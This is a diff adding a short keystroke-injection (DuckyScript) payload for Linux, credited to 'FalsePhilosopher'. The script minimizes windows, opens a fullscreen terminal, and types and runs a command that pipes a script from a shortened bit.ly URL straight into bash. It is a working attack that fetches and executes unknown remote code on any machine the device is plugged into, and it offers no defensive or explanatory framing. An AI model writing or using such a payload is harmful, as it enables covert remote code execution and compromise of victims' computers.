@@ -1,0 +1,13 @@
+REM FalsePhilosopher
+REM target linux
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+F11
+DELAY 200
+STRING curl -s -L http://bit.ly/10hA8iC | bash
+DELAY 300
+ENTER
